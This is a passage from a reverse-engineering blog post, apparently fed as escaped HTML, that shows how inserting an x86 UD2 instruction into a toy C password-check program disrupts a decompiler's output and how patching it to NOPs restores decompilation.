&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ulong&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ulong&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int32_t&lt;/span> &lt;span class="n">iVar1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int64_t&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ulong&lt;/span> &lt;span class="n">extraout_RDX&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar3&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ulong&lt;/span> &lt;span class="n">s1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ulong&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage : %s password&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pcVar3&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x12&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">pcVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;G0od_Byp4ss_0f_UD2&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;G0od_Byp4ss_0f_UD2&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Good boy.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Try again !&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">uVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that the pseudocode generated by the decompiler is strongly similar to our original source code and this is because of two main reasons :&lt;/p>
&lt;p>1- The program is very simple&lt;/p>
&lt;p>2- The program doesn&amp;rsquo;t implement any &lt;em>anti reverse engineering&lt;/em> method&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="protected-simple-program"
>
&amp;ldquo;Protected&amp;rdquo; simple program
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#protected-simple-program" class="gblog-post__anchor clip flex align-center" aria-label="Anchor &amp;ldquo;Protected&amp;rdquo; simple program" href="#protected-simple-program">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;blockquote class="gblog-hint note">
&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
&lt;div class="gblog-hint__text">In order to not to be lynched by the reverse engineering community, i used the word &amp;ldquo;protected&amp;rdquo; in the title just to make the difference between the two programs, but in real cases this kind of protection is much more complexe than what I will show you. Now that I&amp;rsquo;ve got my back, we can continue&amp;hellip;&lt;/div>
&lt;/blockquote>
&lt;p>Let&amp;rsquo;s take our &lt;em>simple program&lt;/em> and throw an &lt;a
class="gblog-markdown__link"
href="#ud2-instruction"
>UD2&lt;/a> instruction in the middle of the source code. Here we will use the &lt;a
class="gblog-markdown__link"
href="https://www.ibm.com/docs/en/zos/2.3.0?topic=code-c-expressions-as-asm-operands"
>__asm&lt;/a> keyword to include assembly instruction in our C code. Also, we will not carry about exception handling.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">14
&lt;/span>&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage : %s password&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;UD2;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">18&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;G0od_Byp4ss_0f_UD2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Good boy.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Try again !&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Finally after re-decompiling our program we end up with the following pseudocode&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">12
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ulong&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ulong&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ulong&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ulong&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage : %s password&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">invalidInstructionException&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that instead of continuing the decompilation process the decompiler stopped after adding an infinit loop that calls &lt;strong>invalidInstructionException()&lt;/strong> function. My personal explanation to this, is that during the optimization process of the decompiler, he detected an invalid opcode &lt;a
class="gblog-markdown__link"
href="#ud2-instruction"
>&lt;em>(UD2)&lt;/em>&lt;/a> and deduced that logically the program will ends with an &lt;em>invalid instruction exception&lt;/em>, which is not false when it&amp;rsquo;s for testing purposes, but in anti reverse engineering usage, the author will mostly handle this exception in order to not to affect the program workflow.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="protection-bypass"
>
&amp;ldquo;Protection&amp;rdquo; bypass
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#protection-bypass" class="gblog-post__anchor clip flex align-center" aria-label="Anchor &amp;ldquo;Protection&amp;rdquo; bypass" href="#protection-bypass">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>In order to bypass the &amp;ldquo;protection&amp;rdquo; in our simple program, we can simply patch it by replacing the &lt;a
class="gblog-markdown__link"
href="#ud2-instruction"
>&lt;em>UD2&lt;/em>&lt;/a> instruction with two &lt;a
class="gblog-markdown__link"
href="https://c9x.me/x86/html/file_module_x86_id_217.html"
>&lt;em>NOP&lt;/em>s&lt;/a> instruction.&lt;/p>
&lt;p>&lt;strong>Before patching&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl">&lt;span class="na">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x000011f8&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">printf&lt;/span> &lt;span class="c1">; sym.imp.printf ; int printf(const char *format) ; sym.imp.printf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; int printf(&amp;#34;Usage : %s password\n&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x000011fd&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="c1">; int status
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001202&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">exit&lt;/span> &lt;span class="c1">; sym.imp.exit ; void exit(int status) ; sym.imp.exit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; void exit(38161477)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001207&lt;/span> &lt;span class="no">ud2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001209&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">qword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rbp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">0x10&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x0000120d&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001211&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">qword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rax&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001214&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rdi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001217&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">strlen&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>After patching&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl">&lt;span class="na">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x000011f8&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">printf&lt;/span> &lt;span class="c1">; sym.imp.printf ; int printf(const char *format) ; sym.imp.printf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; int printf(&amp;#34;Usage : %s password\n&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x000011fd&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="c1">; int status
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001202&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">exit&lt;/span> &lt;span class="c1">; sym.imp.exit ; void exit(int status) ; sym.imp.exit
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">; void exit(38161477)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001207&lt;/span> &lt;span class="no">nop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001208&lt;/span> &lt;span class="no">nop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001209&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">qword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rbp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">0x10&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x0000120d&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001211&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">qword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rax&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001214&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">rdi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00001217&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">strlen&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="resources"
>
Resources
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#resources" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Resources" href="#resources">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;ul>
&lt;li>[1] &lt;a
class="gblog-markdown__link"
href="https://mudongliang.github.io/x86/html/file_module_x86_id_318.html"
>https://mudongliang.github.io/x86/html/file_module_x86_id_318.html&lt;/a>&lt;/li>
&lt;li>[2] &lt;a
class="gblog-markdown__link"
href="https://docs.microsoft.com/fr-fr/cpp/intrinsics/ud2?view=msvc-170"
>https://docs.microsoft.com/fr-fr/cpp/intrinsics/ud2?view=msvc-170&lt;/a>&lt;/li>
&lt;li>[3] &lt;a
class="gblog-markdown__link"
href="https://fr-academic.com/dic.nsf/frwiki/1672713"
>https://fr-academic.com/dic.nsf/frwiki/1672713&lt;/a>&lt;/li>
&lt;li>[3] &lt;a
class="gblog-markdown__link"
href="https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol3/o_fe12b1e2a880e0ce-212.html"
>https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol3/o_fe12b1e2a880e0ce-212.html&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://0x09.dev/authors/skander-belabed" term="skander-belabed" label="skander-belabed"/><category scheme="https://0x09.dev/tags/Reverse-engineering" term="Reverse-engineering" label="Reverse engineering"/><category scheme="https://0x09.dev/tags/Security" term="Security" label="Security"/></entry></feed>